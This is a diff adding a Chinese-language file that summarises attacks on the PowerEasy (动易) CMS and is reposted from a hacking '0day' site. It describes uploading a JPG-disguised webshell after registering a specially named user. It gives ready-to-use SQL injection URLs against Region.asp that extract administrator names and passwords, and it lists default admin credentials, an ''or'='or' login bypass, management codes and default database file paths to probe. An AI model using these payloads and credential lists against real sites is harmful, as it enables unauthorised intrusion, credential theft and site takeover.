@@ -1,0 +1,56 @@
+动易漏洞总结
+
+方法1： 
+注册用户 keio.asA
+http://xtfhzx.com/reg/user_reg.asp
+
+上传jpg马
+http://www.URL.com/user/Upload.asp?dialogtype=UserBlogPic&size=5
+
+
+
+方法2：
+
+先暴所有管理员帐号。  
+/Region.asp?Country=tt&City=whytt&Province=shi'+and+1=2+union+select+username+from+PE_Admin+where+1<2+and+'1'='1 
+
+暴管理员密码
+http://127.0.0.1/Region.asp?Country=tt&City=whytt&Province=shi'+and+1=2+union+select+password+from+PE_Admin+where+username="admin"+and+'1'='1
+
+
+用记事本打开网站这个目录下的文件：\config\SiteOption.config ，找到下面的代码处，修改红色标识的代码即可：
+
+<SiteManageCode>8888</SiteManageCode>
+
+ 
+
+2、对于SiteWeaver 版本，请用记事本打开网站根目录下的文件：config.asp，找到下面的代码处，修改红色标识的代码即可：
+
+Const SiteManageCode = "PowerEasy2008"
+
+admin
+admin888
+'or'='or'
+8888
+2007
+2008
+2006
+SiteManageCode8888/SiteManageCode
+PowerEasy2006
+PowerEasy2007
+PowerEasy2008
+database/PowerEasy2006.mdb
+database/PowerEasy2007.mdb
+database/PowerEasy2008.mdb
+database/SiteWeaver6.5.mdb
+database/SiteWeaver.mdb
+找后台方法：
+本文来自易寒网络,转载务必注明原文链接：http://www.80lr.com/oday/229.html
+
+
+
+ 
+
+
+
+ 
